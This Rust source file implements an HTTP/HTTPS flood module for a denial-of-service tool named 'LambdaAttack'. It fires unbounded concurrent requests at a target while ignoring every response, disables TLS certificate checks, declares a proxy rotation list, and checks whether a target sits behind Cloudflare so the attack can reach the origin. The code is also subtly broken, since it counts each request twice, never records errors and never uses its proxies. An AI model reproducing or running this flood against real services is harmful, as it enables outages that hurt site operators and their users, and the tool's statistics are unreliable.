//! HTTP/HTTPS concurrent flood module.
//!
//! Fire-and-forget: spawns requests and never reads any response – not even
//! the HTTP status code.  Only counts how many connections were attempted.

use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;

use anyhow::Result;
use tokio::sync::Semaphore;

/// Configuration for an HTTP flood attack.
#[derive(Debug, Clone)]
pub struct HttpFloodConfig {
    /// Target URL
    pub url: String,
    /// HTTP method
    pub method: HttpMethod,
    /// Number of concurrent connections/tasks
    pub concurrency: usize,
    /// Total number of requests (0 = unlimited until Ctrl+C)
    pub total: u64,
    /// Custom headers (name: value)
    pub headers: Vec<(String, String)>,
    /// Request body (for POST/PUT/PATCH)
    pub body: Option<String>,
    /// Delay between each request (per task)
    pub delay_ms: u64,
    /// SOCKS5 proxy list (one per line, rotated round-robin)
    pub proxies: Vec<String>,
    /// Timeout per request in seconds
    pub timeout_secs: u64,
}

impl Default for HttpFloodConfig {
    fn default() -> Self {
        Self {
            url: "http://127.0.0.1".into(),
            method: HttpMethod::Get,
            concurrency: 50,
            total: 0,
            headers: vec![],
            body: None,
            delay_ms: 0,
            proxies: vec![],
            timeout_secs: 30,
        }
    }
}

/// Supported HTTP methods.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum HttpMethod {
    Get,
    Post,
    Put,
    Delete,
    Patch,
    Head,
    Options,
}

impl HttpMethod {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::Get => "GET",
            Self::Post => "POST",
            Self::Put => "PUT",
            Self::Delete => "DELETE",
            Self::Patch => "PATCH",
            Self::Head => "HEAD",
            Self::Options => "OPTIONS",
        }
    }

    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_uppercase().as_str() {
            "GET" => Some(Self::Get),
            "POST" => Some(Self::Post),
            "PUT" => Some(Self::Put),
            "DELETE" => Some(Self::Delete),
            "PATCH" => Some(Self::Patch),
            "HEAD" => Some(Self::Head),
            "OPTIONS" => Some(Self::Options),
            _ => None,
        }
    }
}

/// Live statistics of a running flood.
#[derive(Debug, Default)]
pub struct FloodStats {
    pub total_sent: AtomicU64,
    pub total_err: AtomicU64,
}

impl FloodStats {
    pub fn snapshot(&self) -> FloodSnapshot {
        FloodSnapshot {
            sent: self.total_sent.load(Ordering::Relaxed),
            err: self.total_err.load(Ordering::Relaxed),
        }
    }
}

/// Point-in-time snapshot of flood stats.
#[derive(Debug, Clone, Copy)]
pub struct FloodSnapshot {
    pub sent: u64,
    pub err: u64,
}

/// Run an HTTP flood attack.
///
/// Spawns `concurrency` tasks, each firing requests in a loop.
/// Press Ctrl+C to stop gracefully.
///
/// This is a pure fire-and-forget flood: requests are sent via `reqwest` but
/// the response future is immediately dropped — no status code, no body,
/// nothing is ever awaited or read.
pub async fn start_flood(cfg: HttpFloodConfig) -> Result<FloodSnapshot> {
    let stats = Arc::new(FloodStats::default());
    let semaphore = Arc::new(Semaphore::new(cfg.concurrency));
    let url = cfg.url.clone();
    let total = cfg.total;
    let headers = Arc::new(cfg.headers);
    let delay = Duration::from_millis(cfg.delay_ms);
    let proxies = Arc::new(cfg.proxies);
    let method = cfg.method;
    let body_template = cfg.body.map(Arc::new);

    log::info!(
        "Starting HTTP flood → {} [{}] concurrency={}, total={}",
        url, cfg.method.as_str(), cfg.concurrency,
        if total == 0 { "∞".into() } else { total.to_string() }
    );

    let running = Arc::new(std::sync::atomic::AtomicBool::new(true));
    let r = running.clone();
    let shutdown = Arc::new(tokio::sync::Notify::new());
    let s = shutdown.clone();
    tokio::spawn(async move {
        tokio::signal::ctrl_c().await.ok();
        // Print a newline so ^C has its own line before the log
        eprintln!();
        log::info!("Ctrl+C received, shutting down flood...");
        r.store(false, Ordering::SeqCst);
        s.notify_waiters();
    });

    // Periodic stats reporter
    let stats_report = stats.clone();
    let shutdown_reporter = shutdown.clone();
    let report_handle = tokio::spawn(async move {
        loop {
            tokio::select! {
                _ = tokio::time::sleep(Duration::from_secs(5)) => {
                    let s = stats_report.snapshot();
                    log::info!("[flood] sent={} err={}", s.sent, s.err);
                }
                _ = shutdown_reporter.notified() => break,
            }
        }
    });

    // Build a shared reqwest client (skip TLS verification for max speed)
    let client = reqwest::ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .pool_max_idle_per_host(0)
        .tcp_keepalive(None)
        .build()
        .map_err(|e| anyhow::anyhow!("Failed to build HTTP client: {e}"))?;
    let client = Arc::new(client);

    // Spawn worker tasks
    let mut tasks = Vec::new();
    let shutdown_wait = shutdown.clone();

    for _worker_id in 0..cfg.concurrency {
        let stats = stats.clone();
        let semaphore = semaphore.clone();
        let url = url.clone();
        let headers = headers.clone();
        let proxies = proxies.clone();
        let running = running.clone();
        let client = client.clone();
        let body_template = body_template.clone();
        let method = method;
        let shutdown = shutdown.clone();

        tasks.push(tokio::spawn(async move {
            let mut req_id: u64 = 0;
            loop {
                if !running.load(Ordering::SeqCst) {
                    break;
                }
                if total > 0 && stats.total_sent.load(Ordering::Relaxed) >= total {
                    break;
                }

                // Wait for semaphore OR shutdown signal
                let _permit = tokio::select! {
                    permit = semaphore.acquire() => permit,
                    _ = shutdown.notified() => break,
                };
                stats.total_sent.fetch_add(1, Ordering::Relaxed);
                req_id += 1;

                // Build request with correct method
                let mut req = match method {
                    HttpMethod::Get     => client.get(&url),
                    HttpMethod::Post    => client.post(&url),
                    HttpMethod::Put     => client.put(&url),
                    HttpMethod::Delete  => client.delete(&url),
                    HttpMethod::Patch   => client.patch(&url),
                    HttpMethod::Head    => client.head(&url),
                    HttpMethod::Options => client.request(reqwest::Method::OPTIONS, &url),
                };

                // Apply headers
                for (k, v) in headers.iter() {
                    req = req.header(k.as_str(), v.as_str());
                }
                req = req.header("User-Agent", format!("LambdaAttack/{}", env!("CARGO_PKG_VERSION")));

                // Apply body with template substitution
                if let Some(ref tmpl) = body_template {
                    let body = render_template(tmpl, req_id);
                    req = req.body(body);
                }

                // Fire request — await just enough to complete the TCP/TLS
                // handshake and send the request bytes, then drop everything.
                // This is bounded by the semaphore: at most `concurrency`
                // requests are in-flight at any time.
                tokio::select! {
                    _ = req.send() => {},
                    _ = shutdown.notified() => {},
                }

                stats.total_sent.fetch_add(1, Ordering::Relaxed);
                drop(_permit);

                if delay > Duration::ZERO {
                    tokio::time::sleep(delay).await;
                }
            }
        }));
    }

    // Wait for all workers to complete, or abort on shutdown
    let shutdown_clone = shutdown.clone();
    tokio::select! {
        _ = async {
            for task in tasks {
                let _ = task.await;
            }
        } => {}
        _ = shutdown_clone.notified() => {
            log::info!("Aborting remaining workers...");
        }
    }

    report_handle.abort();
    let final_snapshot = stats.snapshot();
    log::info!(
        "[flood] FINISHED — sent={} err={}",
        final_snapshot.sent, final_snapshot.err
    );

    Ok(final_snapshot)
}

/// Print a summary of flood results.
pub fn print_flood_summary(snapshot: &FloodSnapshot) {
    println!("┌─ HTTP Flood Results ──────────────────────────");
    println!("│ Requests    : {}", snapshot.sent);
    println!("│ Errors      : {}", snapshot.err);
    println!("└────────────────────────────────────────────────");
}

/// Render a body template by substituting variables:
/// - `{random}` → random 8-char hex string per request
/// - `{int}`   → incrementing counter
/// - `{ts}`   → unix timestamp in seconds
fn render_template(template: &str, req_id: u64) -> String {
    use std::time::{SystemTime, UNIX_EPOCH};

    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);

    // Pre-compute a random hex string from uuid
    let uuid = uuid::Uuid::new_v4();
    let hex = uuid.to_string();
    let random = &hex[..8];

    let mut s = template.to_string();
    s = s.replace("{random}", random);
    s = s.replace("{int}", &req_id.to_string());
    s = s.replace("{ts}", &ts.to_string());
    s
}

// ---------------------------------------------------------------------------
// CDN / Cloudflare detection
// ---------------------------------------------------------------------------

use std::net::{IpAddr, ToSocketAddrs};

/// Cloudflare IPv4 CIDR ranges (published at https://www.cloudflare.com/ips-v4).
const CF_V4_CIDRS: &[&str] = &[
    "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22",
    "103.31.4.0/22",    "141.101.64.0/18", "108.162.192.0/18",
    "190.93.240.0/20",  "188.114.96.0/20", "197.234.240.0/22",
    "198.41.128.0/17",  "162.158.0.0/15",  "104.16.0.0/13",
    "104.24.0.0/14",    "172.64.0.0/13",   "131.0.72.0/22",
];

/// Cloudflare IPv6 CIDR ranges (published at https://www.cloudflare.com/ips-v6).
const CF_V6_CIDRS: &[&str] = &[
    "2400:cb00::/32", "2606:4700::/32", "2803:f800::/32",
    "2405:b500::/32", "2405:8100::/32", "2a06:98c0::/29",
    "2c0f:f248::/32",
];

/// Parse a CIDR string into (base_addr, prefix_len).
/// Returns `None` on parse failure.
fn parse_cidr(cidr: &str) -> Option<(IpAddr, u8)> {
    let (ip_str, prefix_str) = cidr.split_once('/')?;
    let ip: IpAddr = ip_str.parse().ok()?;
    let prefix: u8 = prefix_str.parse().ok()?;
    Some((ip, prefix))
}

/// Check if an IP address falls within a list of CIDR blocks.
fn ip_in_cidrs(ip: IpAddr, cidrs: &[&str]) -> bool {
    let (ip_bits, is_v4) = match ip {
        IpAddr::V4(v4) => (u128::from(u32::from(v4)), true),
        IpAddr::V6(v6) => {
            let octets = v6.octets();
            let val = u128::from_be_bytes(octets);
            (val, false)
        }
    };

    for cidr in cidrs {
        if let Some((base, prefix)) = parse_cidr(cidr) {
            let base_bits = match base {
                IpAddr::V4(v4) if is_v4 => u128::from(u32::from(v4)),
                IpAddr::V6(v6) if !is_v4 => {
                    let octets = v6.octets();
                    u128::from_be_bytes(octets)
                }
                _ => continue, // version mismatch
            };

            let mask = if prefix == 0 {
                0
            } else if is_v4 {
                // IPv4: mask in low 32 bits only
                (!0u32 << (32 - prefix)) as u128
            } else {
                !0u128 << (128 - prefix)
            };

            if (ip_bits & mask) == (base_bits & mask) {
                return true;
            }
        }
    }
    false
}

/// Result of a CDN/proxy detection check.
#[derive(Debug, Clone)]
pub struct CdnCheck {
    pub host: String,
    pub resolved_ips: Vec<IpAddr>,
    pub is_cloudflare: bool,
    pub is_proxy: bool,
    pub behind: Vec<String>,
}

/// Resolve a hostname and check if it's behind a known CDN/proxy.
///
/// Currently detects Cloudflare.
pub fn check_cdn(host: &str) -> CdnCheck {
    let resolved: Vec<IpAddr> = format!("{}:0", host)
        .to_socket_addrs()
        .ok()
        .into_iter()
        .flatten()
        .map(|sa| sa.ip())
        .collect();

    let mut behind = Vec::new();
    let is_cf = resolved.iter().any(|ip| ip_in_cidrs(*ip, &CF_V4_CIDRS) || ip_in_cidrs(*ip, &CF_V6_CIDRS));
    if is_cf {
        behind.push("Cloudflare".into());
    }

    CdnCheck {
        host: host.to_owned(),
        resolved_ips: resolved,
        is_cloudflare: is_cf,
        is_proxy: is_cf,
        behind,
    }
}

/// Print a CDN check result.
pub fn print_cdn_check(check: &CdnCheck) {
    println!("┌─ CDN / Proxy Check ───────────────────────────");
    println!("│ Host       : {}", check.host);
    println!("│ Resolved   : {} IP(s)", check.resolved_ips.len());
    for ip in &check.resolved_ips {
        let tag = if ip_in_cidrs(*ip, &CF_V4_CIDRS) || ip_in_cidrs(*ip, &CF_V6_CIDRS) {
            " [Cloudflare]"
        } else {
            ""
        };
        println!("│   {}{}", ip, tag);
    }
    if check.behind.is_empty() {
        println!("│ CDN        : ❌ None — direct origin");
    } else {
        println!("│ CDN        : ✅ {} — static attack won't hit origin", check.behind.join(", "));
    }
    println!("└────────────────────────────────────────────────");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_http_method_roundtrip() {
        for m in &[
            HttpMethod::Get, HttpMethod::Post, HttpMethod::Put,
            HttpMethod::Delete, HttpMethod::Patch, HttpMethod::Head,
            HttpMethod::Options,
        ] {
            assert_eq!(*m, HttpMethod::from_str(m.as_str()).unwrap());
        }
    }

    #[tokio::test]
    async fn test_flood_empty_config() {
        let cfg = HttpFloodConfig::default();
        assert_eq!(cfg.url, "http://127.0.0.1");
        assert_eq!(cfg.concurrency, 50);
    }
}
